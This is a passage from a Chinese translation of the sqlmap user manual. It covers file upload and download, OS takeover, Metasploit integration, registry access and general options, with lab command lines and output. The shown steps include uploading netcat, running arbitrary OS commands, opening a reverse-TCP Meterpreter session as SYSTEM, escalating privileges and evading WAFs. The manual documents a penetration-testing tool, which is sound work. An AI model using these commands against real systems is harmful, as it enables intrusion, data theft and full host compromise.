C:/example.exe file saved to:    '/software/sqlmap/output/192.168.136.129/files/
C__example.exe'
[...]

$ ls -l output/192.168.136.129/files/C__example.exe 
-rw-r--r-- 1 inquis inquis 2560 2011-MM-DD hh:mm output/192.168.136.129/files/C_
_example.exe

$ file output/192.168.136.129/files/C__example.exe 
output/192.168.136.129/files/C__example.exe: PE32 executable for MS Windows (GUI
) Intel 80386 32-bit
```

### 将文件上载到数据库服务器的文件系统
选项: `--file-write` 和 `--file-dest`

当后端数据库管理系统是MySQL、PostgreSQL或Microsoft SQL server时，可以将本地文件上载到数据库服务器的文件系统中，并且会话用户具有滥用数据库特定功能和架构弱点所需的特权。指定的文件可以是文本文件或二进制文件。sqlmap将正确处理它。

这些技术在白皮书中很详细 [Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857).

针对MySQL的目标上传一个二进制压缩文件的示例:

```
$ file /software/nc.exe.packed 
/software/nc.exe.packed: PE32 executable for MS Windows (console) Intel 80386 32
-bit

$ ls -l /software/nc.exe.packed
-rwxr-xr-x 1 inquis inquis 31744 2009-MM-DD hh:mm /software/nc.exe.packed

$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/get_int.aspx?id=1" -\
-file-write "/software/nc.exe.packed" --file-dest "C:/WINDOWS/Temp/nc.exe" -v 1

[...]
[hh:mm:29] [INFO] the back-end DBMS is MySQL
web server operating system: Windows 2003 or 2008
web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727
back-end DBMS: MySQL >= 5.0.0

[...]
do you want confirmation that the file 'C:/WINDOWS/Temp/nc.exe' has been success
fully written on the back-end DBMS file system? [Y/n] y
[hh:mm:52] [INFO] retrieved: 31744
[hh:mm:52] [INFO] the file has been successfully written and its size is 31744 b
ytes, same size as the local file '/software/nc.exe.packed'
```

## 操作系统的接管

### 运行任意操作系统命令

选项和开关: `--os-cmd` 和 `--os-shell`

当后端数据库管理系统是MySQL、PostgreSQL或Microsoft SQL server时，可以**在数据库服务器的底层操作系统上运行任意命令**，而会话用户拥有滥用数据库特定功能和架构弱点所需的特权。

在MySQL和PostgreSQL中，sqlmap上传(通过上面解释的文件上传功能)共享库(二进制文件)，其中包含两个用户定义函数，`sys_exec()` 和 `sys_eval()`, 然后，它在数据库中创建这两个函数，并调用其中一个函数执行指定的命令，这取决于用户选择显示标准输出。在Microsoft SQL Server上，sqlmap滥用了 `xp_cmdshell`存储过程:如果它是禁用的(默认情况下是在Microsoft SQL Server > = 2005)，sqlmap重新启用它;如果它不存在，sqlmap将从头创建它。

当用户请求标准输出时，sqlmap使用一个枚举SQL注入技术(blind, inband or error-based)来检索它。反之亦然，如果不需要标准输出，则使用堆叠查询SQL注入技术来执行命令。

这些技术在白皮书中很详细[Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857).

针对PostgreSQL目标的示例:

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --\
os-cmd id -v 1

[...]
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: PostgreSQL
[hh:mm:12] [INFO] fingerprinting the back-end DBMS operating system
[hh:mm:12] [INFO] the back-end DBMS operating system is Linux
[hh:mm:12] [INFO] testing if current user is DBA
[hh:mm:12] [INFO] detecting back-end DBMS version from its banner
[hh:mm:12] [INFO] checking if UDF 'sys_eval' already exist
[hh:mm:12] [INFO] checking if UDF 'sys_exec' already exist
[hh:mm:12] [INFO] creating UDF 'sys_eval' from the binary UDF file
[hh:mm:12] [INFO] creating UDF 'sys_exec' from the binary UDF file
do you want to retrieve the command standard output? [Y/n/a] y
command standard output:    'uid=104(postgres) gid=106(postgres) groups=106(post
gres)'

[hh:mm:19] [INFO] cleaning up the database management system
do you want to remove UDF 'sys_eval'? [Y/n] y
do you want to remove UDF 'sys_exec'? [Y/n] y
[hh:mm:23] [INFO] database management system cleanup finished
[hh:mm:23] [WARNING] remember that UDF shared object files saved on the file sys
tem can only be deleted manually
```

还可以模拟一个真正的shell，在这里您可以任意输入任意命令。选项是`--os-shell` ，并具有与 `--sql-shell` 相同的选项卡完成和历史功能。

堆叠查询尚未确定在web应用程序(如PHP、ASP与后端数据库管理系统是MySQL)和DBMS MySQL,仍有可能滥用 `选择` 条款的 `到输出文件`可写文件夹中创建一个web后门在web服务器的文档根目录,仍然得到命令执行假设后端数据库管理系统和web服务器驻留在同一台服务器上。sqlmap支持这种技术，并允许用户提供一个以逗号分隔的可能的文档根子文件夹列表，在其中尝试上传web文件stager和随后的web后门。另外，sqlmap也有自己的测试web文件stager和以下语言的后门:

* ASP
* ASP.NET
* JSP
* PHP

### 带外状态连接:Meterpreter和friends

开关和选项: `--os-pwn`, `--os-smbrelay`, `--os-bof`, `--priv-esc`, `--msf-path` 和 `--tmp-path`

可以建立一个 **带外有状态的攻击者之间的TCP连接机器和数据库服务器** 底层操作系统后端数据库管理系统时MySQL、PostgreSQL或Microsoft SQL server,会话用户所需的特权滥用数据库特定功能和架构的弱点。这个通道可以是交互式命令提示符、Meterpreter会话或图形用户界面(VNC)作为每个用户的选择。

sqlmap依赖于Metasploit来创建shell代码并实现四种不同的技术来在数据库服务器上执行它。这些技术包括:

* 通过sqlmap拥有用户定义的函数 `sys_bineval()`，实现数据库 **Metasploit的shell代码的内存执行** 。支持MySQL和PostgreSQL - 开关 `--os-pwn`.
* 通过sqlmap自己的用户定义函数`sys_exec()`，上载和执行一个Metasploit的 **s独立有效负载** ，在MySQL和PostgreSQL或通过`xp_cmdshell()`在微软的SQL服务器上 - 开关 `--os-pwn`.
* 通过执行**SMB反射攻击**来执行Metasploit的shell代码 ([MS08-068](http://www.microsoft.com/technet/security/Bulletin/MS08-068.mspx)) 通过一条从数据库服务器到攻击者的机器的UNC路径请求， 其中 Metasploit `smb_relay` 服务器利用侦听器。 在运行sqlmap时，在Linux / Unix上使用高权限 (`uid=0`) 在Linux / Unix上，目标DBMS在Windows上作为管理员运行 - 开关 `--os-smbrelay`.
* 通过开发 **Microsoft SQL Server 2000 and 2005`sp_replwritetovarbin` stored procedure heap-based buffer overflow**Metasploit的shell代码的数据库内存执行 ([MS09-004](http://www.microsoft.com/technet/security/bulletin/ms09-004.mspx)). ssqlmap有自己的漏洞来触发
使用自动DEP内存保护旁路的漏洞，但它依赖于Metasploit来生成被执行的成功的开发 - 开关 `--os-bof`.

这些技术在白皮书中很详细 [Advanced SQL injection to operating system full control](http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857) 在幻灯片上 [Expanding the control over the operating system from the database](http://www.slideshare.net/inquis/expanding-the-control-over-the-operating-system-from-the-database).

针对MySQL目标的例子:

```
$ python sqlmap.py -u "http://192.168.136.129/sqlmap/mysql/iis/get_int_55.aspx?\
id=1" --os-pwn --msf-path /software/metasploit

[...]
[hh:mm:31] [INFO] the back-end DBMS is MySQL
web server operating system: Windows 2003
web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 6.0
back-end DBMS: MySQL 5.0
[hh:mm:31] [INFO] fingerprinting the back-end DBMS operating system
[hh:mm:31] [INFO] the back-end DBMS operating system is Windows
how do you want to establish the tunnel?
[1] TCP: Metasploit Framework (default)
[2] ICMP: icmpsh - ICMP tunneling
> 
[hh:mm:32] [INFO] testing if current user is DBA
[hh:mm:32] [INFO] fetching current user
what is the back-end database management system architecture?
[1] 32-bit (default)
[2] 64-bit
> 
[hh:mm:33] [INFO] checking if UDF 'sys_bineval' already exist
[hh:mm:33] [INFO] checking if UDF 'sys_exec' already exist
[hh:mm:33] [INFO] detecting back-end DBMS version from its banner
[hh:mm:33] [INFO] retrieving MySQL base directory absolute path
[hh:mm:34] [INFO] creating UDF 'sys_bineval' from the binary UDF file
[hh:mm:34] [INFO] creating UDF 'sys_exec' from the binary UDF file
how do you want to execute the Metasploit shellcode on the back-end database und
erlying operating system?
[1] Via UDF 'sys_bineval' (in-memory way, anti-forensics, default)
[2] Stand-alone payload stager (file system way)
> 
[hh:mm:35] [INFO] creating Metasploit Framework multi-stage shellcode 
which connection type do you want to use?
[1] Reverse TCP: Connect back from the database host to this machine (default)
[2] Reverse TCP: Try to connect back from the database host to this machine, on 
all ports 
between the specified and 65535
[3] Bind TCP: Listen on the database host for a connection
> 
which is the local address? [192.168.136.1] 
which local port number do you want to use? [60641] 
which payload do you want to use?
[1] Meterpreter (default)
[2] Shell
[3] VNC
> 
[hh:mm:40] [INFO] creation in progress ... done
[hh:mm:43] [INFO] running Metasploit Framework command line interface locally, p
lease wait..

                                _
                                | |      o
_  _  _    _ _|_  __,   ,    _  | |  __    _|_
/ |/ |/ |  |/  |  /  |  / \_|/ \_|/  /  \_|  |
|  |  |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/
                        /|
                        \|


    =[ metasploit v3.7.0-dev [core:3.7 api:1.0]
+ -- --=[ 674 exploits - 351 auxiliary
+ -- --=[ 217 payloads - 27 encoders - 8 nops
    =[ svn r12272 updated 4 days ago (2011.04.07)

PAYLOAD => windows/meterpreter/reverse_tcp
EXITFUNC => thread
LPORT => 60641
LHOST => 192.168.136.1
[*] Started reverse handler on 192.168.136.1:60641 
[*] Starting the payload handler...
[hh:mm:48] [INFO] running Metasploit Framework shellcode remotely via UDF 'sys_b
ineval', please wait..
[*] Sending stage (749056 bytes) to 192.168.136.129
[*] Meterpreter session 1 opened (192.168.136.1:60641 -> 192.168.136.129:1689) a
t Mon Apr 11 hh:mm:52 +0100 2011

meterpreter > Loading extension espia...success.
meterpreter > Loading extension incognito...success.
meterpreter > [-] The 'priv' extension has already been loaded.
meterpreter > Loading extension sniffer...success.
meterpreter > System Language : en_US
OS              : Windows .NET Server (Build 3790, Service Pack 2).
Computer        : W2K3R2
Architecture    : x86
Meterpreter     : x86/win32
meterpreter > Server username: NT AUTHORITY\SYSTEM
meterpreter > ipconfig

MS TCP Loopback interface
Hardware MAC: 00:00:00:00:00:00
IP Address  : 127.0.0.1
Netmask     : 255.0.0.0



Intel(R) PRO/1000 MT Network Connection
Hardware MAC: 00:0c:29:fc:79:39
IP Address  : 192.168.136.129
Netmask     : 255.255.255.0


meterpreter > exit

[*] Meterpreter session 1 closed.  Reason: User exit
```

默认情况下，MySQL作为 `系统`在Windows上运行, 但是PostgreSQL在Windows和Linux上都是低权限用户的 `数据库` 。默认情况下，微软SQL Server 2000作为`SYSTEM`运行，而微软SQL Server 2005和2008运行的大部分时间是 `网络服务` 有时则是 `本地服务`。

通过Metasploit的 `getsystem` 命令，包括其他命令，使用`--priv-esc` 开关提供sqlmap来执行**数据库进程的用户权限升级**， [kitrap0d](http://archives.neohapsis.com/archives/fulldisclosure/2010-01/0346.html) 技术 ([MS10-015](http://www.microsoft.com/technet/security/bulletin/ms10-015.mspx)).

## Windows注册表访问

当后端数据库管理系统是MySQL、PostgreSQL或Microsoft SQL Server时，以及当web应用程序支持堆叠查询时，可以访问Windows注册表。而且，会话用户必须具有访问它的所需权限。

### 读取Windows注册表的键值

开关: `--reg-read`

使用这个开关，您可以读取注册表键值。

### 编写一个Windows注册表的键值

开关: `--reg-add`

使用这个开关，您可以编写注册表键值。

### 删除一个Windows注册表键

开关: `--reg-del`

使用这个开关你可以删除注册表键。

### 辅助注册选项

选项: `--reg-key`, `--reg-value`, `--reg-data` and `--reg-type`

这些选项可用于提供正确运行开关 `--reg-read`, `--reg-add` 和  `--reg-del`的数据。因此，当被询问时，您不能提供注册表关键信息，您可以在命令提示符中使用它们作为程序参数。

使用 `--reg-key` 选项指定使用的Windows注册表键路径，使用 `--reg-value` 的值项目名称在内部提供键，使用 `--reg-data` 值数据，同时，使用 `--reg-type`选项指定值项的类型。

命令行用于添加注册中心密钥蜂箱的示例:

```
$ python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --r\
eg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-ty\
pe=REG_SZ --reg-data=1
```

## General综述

这些选项可以用来设置一些通用的工作参数.

### 从存储的(.sqlite)文件加载会话

选项: `-s`

sqlmap自动为每个目标创建一个持久的会话SQLite文件, 有内部专用的输出目录, 用以存储会话恢复所需的所有数据. 如果用户想要显式地设置会话文件位置(例如在一个地方存储多个目标的会话数据)，他可以使用这个选项.

### 将HTTP(s)流量记录到文本文件中

选项: `-t`

这个选项需要一个参数，指定文本文件来编写由sqlmap-HTTP(s)请求和HTTP(s)响应生成的所有HTTP(s)通信流. 

者主要用于调试目的 - 当您为开发人员提供潜在的bug报告时，也要发送这个文件.

### 在非交互式模式操作

开关: `--batch`

如果您希望sqlmap作为批处理工具运行, 当sqlmap需要它时没有任何用户的交互, 你可以通过使用开关`--batch`来强制使用. 这将使sqlmap在需要用户输入时使用默认行为. 

### 二进制内容检索

选项 `--binary-fields`

在二进制内容检索的情况下, 就像例如具有存储二进制值的列(s)表的表(例如，带有二进制存储的密码散列值的列密码), 可以使用选项`--binary-fields`针对(额外的)处理sqlmap的正确处理. 然后，所有这些字段(例如表列)将被检索和表示为十六进制，因此之后它们可以用其他工具进行适当的处理(例如`john`).

### 用于数据检索的强制字符编码

选项: `--charset`

为了正确解码字符数据，sqlmap使用了web服务器提供的信息(例如HTTP头内容类型)或来自第三方库[chardet](https://pypi.python.org/pypi/chardet)查得的启发式结果.

然而, 有些情况下，这个值必须被覆盖, 特别是当检索包含国际非ascii字符的数据时(例如:“——charset = GBK”). 需要注意的是，由于存储数据库内容和目标端使用的数据库连接器之间的隐含不兼容性，字符信息可能会不可逆转地丢失.

### 从目标URL开始抓取网站
选项: `--crawl`

sqlmap可以通过从目标位置开始收集(爬行)以收集潜在的脆弱的链接. 使用这个选项用户可以设置一个深度(从起始位置的距离)，sqlmap不会在收集阶段进行，因为这个过程是递归的，只要有新的链接可以访问就可以.

针对MySQL目标运行的示例:

```
$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/" --batch --crawl=3
[...]
[xx:xx:53] [INFO] starting crawler
[xx:xx:53] [INFO] searching for links with depth 1
[xx:xx:53] [WARNING] running in a single-thread mode. This could take a while
[xx:xx:53] [INFO] searching for links with depth 2
[xx:xx:54] [INFO] heuristics detected web page charset 'ascii'
[xx:xx:00] [INFO] 42/56 links visited (75%)
[...]
```

选项 `--crawl-exclude`

有了这个选项，你可以通过提供一个正则表达式来排除页面的爬行. 例如,如果你想跳过所有在他们的路径中有关键字登出的页面,你可以使用`--crawl-exclude=logout`.

### 在CSV输出中使用的限制字符

选项: `--csv-del`

当被转储的数据存储到CSV格式(`--dump-format=CSV`)时, 条目必须与“分离值”(默认值)分离(default is `,`). 如果用户想要覆盖默认值，他可以使用这个选项(例如`--csv-del=";"`).

### DBMS身份验证凭证

选项: `--dbms-cred`

在某些情况下，用户会被警告说某些操作失败是因为缺少当前的DBMS用户特权，这时他可以尝试使用这个选项. 在这种情况下, 如果他使用这个选项向sqlmap提供了管理用户凭证, sqlmap将尝试使用这些凭证并使用专门的“run”机制重新运行问题部分 (例如微软SQL服务器上的`OPENROWSET`).

### 废弃数据的格式

选项: `--dump-format`

当将转储表数据存储到输出目录中的相应文件中时，sqlmap支持三种不同类型的格式: `CSV`, `HTML`和`SQLITE`.默认的是`CSV`,将每个表行按行存储到一个文本文件行中, 每个条目都用逗号`,`分隔 (或者提供一个选项`--csv-del`). 关于`HTML`, 输出被存储到一个HTML文件中, 在一个格式化的表中，每一行都用一行表示. 关于 `SQLITE`, 输出被存储到SQLITE数据库中, 将原始表内容复制到具有相同名称的相应表中.

### 预计到达时间

开关: `--eta`

可以实时计算并显示到达的估计时间来检索每个查询输出. 这显示了用于检索输出的技术是任意盲SQL注入类型. 

针对Oracle目标只受布尔值的盲SQL注入的影响的示例:

```
$ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int_bool.php?id\
=1" -b --eta

[...]
[hh:mm:01] [INFO] the back-end DBMS is Oracle
[hh:mm:01] [INFO] fetching banner
[hh:mm:01] [INFO] retrieving the length of query output
[hh:mm:01] [INFO] retrieved: 64
17% [========>                                          ] 11/64  ETA 00:19
```

然后:

```
100% [===================================================] 64/64
[hh:mm:53] [INFO] retrieved: Oracle Database 10g Enterprise Edition Release 10.2
.0.1.0 - Prod

web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: Oracle
banner:    'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod'
```

正如你所看到的, sqlmap首先计算查询输出的长度, 然后估计到达的时间, 显示百分比的百分比，并计算检索到的输出字符的数量. 

### 清理会话文件

选项: `--flush-session`

因为您已经熟悉了上面描述的会话文件的概念, 您知道可以使用选项`--flush-session`来刷新该文件的内容将会非常有用. 通过这种方式，您可以避免在sqlmap中默认实现的缓存机制. 另一种可能的方法是手动删除会话文件. 

### 解析和测试表单的输入字段

开关: `--forms`

假设您想要对SQL注入进行测试，这是一个巨大的搜索表单，或者您想要测试一个登录通道(通常只有两个输入字段，如用户名和密码), 您可以在请求文件(`-r`)中传递请求，并相应地设置发布的数据(`--data`)，或者让sqlmap为您完成! 

上面提到的两个例子，以及很多其他的，都是在HTML响应体中出现的标签，例如<form>`和` <input>`，这就是这个开关发挥作用的地方.

向sqlmap提供`--forms`以及可以找到表单的页面作为目标URL`--forms`，sqlmap将为您请求目标URL, 解析它所拥有的表单，并引导您完成对这些表单输入字段(参数)的SQL注入测试，而不是提供的目标URL. 

### 忽略会话文件中的存储查询结果

开关: `--fresh-queries`

因为您已经熟悉了上面描述的会话文件的概念, 您知道可以使用选项`--fresh-queries`忽略该文件的内容将会非常有用. 通过这种方式，您可以保持会话文件不受影响，并且对于所选择运行的部分，避免查询输出的恢复. 

### 使用DBMS十六进制函数进行数据检索
开关: `--hex`

在丢失非ascii数据的情况下，需要特殊的必需品. 解决这个问题的一个解决方案是使用DBMS十六进制函数.打开这个开关,数据将被编辑为在检索之前和之后未编码的原始形式的十六进制形式.

针对PostgreSQL目标的示例:

```
$ python sqlmap.py -u "http://192.168.48.130/sqlmap/pgsql/get_int.php?id=1" --b\
anner --hex -v 3 --parse-errors

[...]
[xx:xx:14] [INFO] fetching banner
[xx:xx:14] [PAYLOAD] 1 AND 5849=CAST((CHR(58)||CHR(118)||CHR(116)||CHR(106)||CHR
(58))||(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION() AS CHARACTER(10000)),(CHR(32)
))),(CHR(85)||CHR(84)||CHR(70)||CHR(56))),(CHR(72)||CHR(69)||CHR(88))))::text||(
CHR(58)||CHR(110)||CHR(120)||CHR(98)||CHR(58)) AS NUMERIC)
[xx:xx:15] [INFO] parsed error message: 'pg_query() [<a href='function.pg-query'
>function.pg-query</a>]: Query failed: ERROR:  invalid input syntax for type num
eric: ":vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d
676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c20284465626961
6e2032e332e322d312e312920342e332e32:nxb:" in <b>/var/www/sqlmap/libs/pgsql.inc.p
hp</b> on line <b>35</b>'
[xx:xx:15] [INFO] retrieved: PostgreSQL 8.3.9 on i486-pc-linux-gnu, compiled by 
GCC gcc-4.3.real (Debian 4.3.2-1.1) 4.3.2
[...]
```

### 自定义输出目录路径

选项: `--output-dir`

默认情况下，sqlmap会在子目录`output`中（输出）存储会话和结果文件. 如果你想使用一个不同的位置，你可以使用这个选项(例如`--output-dir=/tmp`).

### 解析来自响应页面的DBMS错误消息

开关: `--parse-errors`

如果web应用程序是在调试模式下配置的，以便在HTTP响应中显示后端数据库管理系统错误消息，sqlmap可以解析并显示它们.

这对于调试目的很有用，比如理解为什么某个枚举或接管开关不起作用- 这可能是会话用户权限的问题，在这种情况中，您将看到一个DBMS错误消息`Access denied for user  <SESSION USER>`. 

针对Microsoft SQL Server目标的示例:

```
$ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1"\
 --parse-errors
[...]
[xx:xx:17] [INFO] ORDER BY technique seems to be usable. This should reduce the 
timeneeded to find the right number of query columns. Automatically extending th
e rangefor current UNION query injection technique test
[xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Driv
ers (0x80040E14)
[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10 i
s out of range of the number of items in the select list.
<b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
[xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Driv
ers (0x80040E14)
[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is
 out of range of the number of items in the select list.
<b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
[xx:xx:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC Driv
ers (0x80040E14)
[Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is
 out of range of the number of items in the select list.
<b>/sqlmap/mssql/iis/get_int.asp, line 27</b>'
[xx:xx:17] [INFO] target URL appears to have 3 columns in query
[...]
```

### 在配置INI文件中保存选项

选项: `--save`

将命令行选项保存到配置INI文件中是可行的. 然后可以对生成的文件进行编辑，并使用 `-c` 选项将其传递给sqlmap.

### 更新sqlmap

开关: `--update`

使用这个选项，您可以直接将工具更新到最新的开发版本[Git repository](https://github.com/sqlmapproject/sqlmap.git). 显然，你需要互联网接入. 

如果由于任何原因，该操作失败，那么从您的sqlmap工作副本中运行`git pull`. 它会执行完全相同的开关操作`--update`. 如果在Windows上运行sqlmap，则可以使用[SmartGit]客户端(http://www.syntevo.com/smartgit/index.html). 

强烈建议，向[mailing lists]提前报告任意bug(http://www.sqlmap.org/#ml).

## 杂项

### 使用短助记符

选项: `-z`

输入所有想要的选项和开关会变得很乏味, 尤其是对那些需要经常使用的(例如`--batch --random-agent --ignore-proxy --technique=BEU`). 有一个更简单，更方便的方法来解决这个问题. 在sqlmap中，它被称为“助记术”.

每个选项和开关都可以用一个较短的助记形式`-z`书写, 用逗号分隔(`,`), 记忆术仅仅代表了最初名字的第一个任意选择的部分. 没有严格的切换到相应的选项和缩写的对应关系. 唯一需要的条件是没有其他选项和开关与它们的前缀一样.

实例:

```
$ python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u "ww\
w.target.com/vuln.php?id=1"
```

可以用更短的记忆形式(多种方式之一)写成:

```
$ python sqlmap.py -z "bat,randoma,ign,tec=BEU" -u "www.target.com/vuln.php?id=\
1"
```

又一实例:

```
$ python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testd\
b -T users -u "www.target.com/vuln.php?id=1"
```

可以用更短的记忆形式写成:

```
$ python sqlmap.py -z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u "www.target.\
com/vuln.php?id=1"
```

###对成功的SQL注入检测的警告

选项: `--alert`

### 回答问题

选项: `--answers`

如果用户想要自动设置问题的答案,即使使用`--batch`进行批处理, 使用这个选项，他可以通过在等号后面给出问题的任何部分和答案来达到目的. 同时,不同问题的答案可以用分隔符`,`分隔开.

针对MySQL目标的示例:

```
$ python sqlmap.py -u "http://192.168.22.128/sqlmap/mysql/get_int.php?id=1"--te\
chnique=E --answers="extending=N" --batch
[...]
[xx:xx:56] [INFO] testing for SQL injection on GET parameter 'id'
heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you 
want to skip test payloads specific for other DBMSes? [Y/n] Y
[xx:xx:56] [INFO] do you want to include all tests for 'MySQL' extending provide
d level (1) and risk (1)? [Y/n] N
[...]
```

### 在发现SQL注入时发出蜂鸣声

开关: `--beep`

如果用户使用开关`--beep`，当SQL注入被发现时，他会立即收到警告.当需要测试目标url的大量列表(option `-m`)时，这一点特别有用.

### 从sqlmap特定的UDF(s)和表(s)中清除DBMS

开关: `--cleanup`

建议从sqlmap临时表中清理后端数据库管理系统，并在接管底层操作系统或文件系统时创建用户定义的函数.开关`--cleanup`将尝试尽可能地清理DBMS和文件系统. 

### 检查依赖关系

开关: `--dependencies`

在某些特殊情况下，sqlmap需要独立安装额外的第三方库(例如在`icmpsh` 隧道中的开关`-d`,开关`--os-pwn`,在`NTLM` HTTP身份验证类型中的开关`--auth-type等等) 并且它只会在这种特殊情况下警告用户. 但是, 如果你想独立检查所有额外的第三方库依赖项你可以使用开关`--dependencies`.

```
$ python sqlmap.py --dependencies
[...]
[xx:xx:28] [WARNING] sqlmap requires 'python-kinterbasdb' third-party library in
 order to directly connect to the DBMS Firebird. Download from http://kinterbasd
b.sourceforge.net/
[xx:xx:28] [WARNING] sqlmap requires 'python-pymssql' third-party library in ord
er to directly connect to the DBMS Sybase. Download from http://pymssql.sourcefo
rge.net/
[xx:xx:28] [WARNING] sqlmap requires 'python pymysql' third-party library in ord
er to directly connect to the DBMS MySQL. Download from https://github.com/peteh
unt/PyMySQL/
[xx:xx:28] [WARNING] sqlmap requires 'python cx_Oracle' third-party library in o
rder to directly connect to the DBMS Oracle. Download from http://cx-oracle.sour
ceforge.net/
[xx:xx:28] [WARNING] sqlmap requires 'python-psycopg2' third-party library in or
der to directly connect to the DBMS PostgreSQL. Download from http://initd.org/p
sycopg/
[xx:xx:28] [WARNING] sqlmap requires 'python ibm-db' third-party library in orde
r to directly connect to the DBMS IBM DB2. Download from http://code.google.com/
p/ibm-db/
[xx:xx:28] [WARNING] sqlmap requires 'python jaydebeapi & python-jpype' third-pa
rty library in order to directly connect to the DBMS HSQLDB. Download from https
://pypi.python.org/pypi/JayDeBeApi/ & http://jpype.sourceforge.net/
[xx:xx:28] [WARNING] sqlmap requires 'python-pyodbc' third-party library in orde
r to directly connect to the DBMS Microsoft Access. Download from http://pyodbc.
googlecode.com/
[xx:xx:28] [WARNING] sqlmap requires 'python-pymssql' third-party library in ord
er to directly connect to the DBMS Microsoft SQL Server. Download from http://py
mssql.sourceforge.net/
[xx:xx:28] [WARNING] sqlmap requires 'python-ntlm' third-party library if you pl
an to attack a web application behind NTLM authentication. Download from http://
code.google.com/p/python-ntlm/
[xx:xx:28] [WARNING] sqlmap requires 'websocket-client' third-party library if y
ou plan to attack a web application using WebSocket. Download from https://pypi.
python.org/pypi/websocket-client/
```

### 禁用控制台输出颜色

开关: `--disable-coloring`

默认情况下，sqlmap在写入控制台时使用着色. 如果没有达到预期效果 (例如未解释的ANSI着色代码如`\x01\x1b[0;32m\x02[INFO]`的控制台外观)通过使用这个开关，可以禁用控制台输出颜色.

### 使用来自指定页面的Google dork结果

开关: `--gpage`

使用选项'-g'的默认sqlmap行为是进行Google搜索并使用前100个结果url进行进一步的SQL注入测试.但是, 结合这个选项，您可以使用这个选项(`--gpage`)指定一个页面，而不是第一个从这个选项中检索目标. 

### 使用HTTP参数污染

开关: `--hpp`

HTTP参数污染(HPP) 是一种绕过ip/ip/ids保护机制的方法(解释在此[here](http://www.imperva.com/resources/glossary/http_parameter_pollution_hpp.html)) 这对asp/iis和ASP以及ASP.NET/IIS平台特别有效. 如果你怀疑目标是这样的保护，你可以通过使用这个开关来绕过它.

### 对一个ip/ip/ids保护进行测试

开关: `--identify-waf`

sqlmap可以尝试识别后端ip/ip/ids保护(如果有的话)，这样用户就可以执行适当的步骤(例如使用篡改脚本`--tamper`). 目前大约有30种不同的产品被支持(Airlock、Barracuda WAF等)，它们各自的WAF脚本可以在WAF目录中找到。.

针对由ModSecurity WAF保护的MySQL目标的例子:

```
$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" --i\
dentify-waf -v 3
[...]
[xx:xx:23] [INFO] testing connection to the target URL
[xx:xx:23] [INFO] heuristics detected web page charset 'ascii'
[xx:xx:23] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'USP Secure Entry Server (Un
ited Security Providers)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'BinarySEC Web Application F
irewall (BinarySEC)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetContinuum Web Applicatio
n Firewall (NetContinuum/Barracuda Networks)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Hyperguard Web Application 
Firewall (art of defence Inc.)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Cisco ACE XML Gateway (Cisc
o Systems)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'TrafficShield (F5 Networks)
'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Teros/Citrix Application Fi
rewall Enterprise (Teros/Citrix Systems)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KONA Security Solutions (Ak
amai Technologies)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Incapsula Web Application F
irewall (Incapsula/Imperva)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'CloudFlare Web Application 
Firewall (CloudFlare)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Barracuda Web Application F
irewall (Barracuda Networks)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'webApp.secure (webScurity)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Proventia Web Application S
ecurity (IBM)'
[xx:xx:23] [DEBUG] declared web page charset 'iso-8859-1'
[xx:xx:23] [DEBUG] page not found (404)
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KS-WAF (Knownsec)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetScaler (Citrix Systems)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Jiasule Web Application Fir
ewall (Jiasule)'
[xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'WebKnight Application Firew
all (AQTRONIX)'
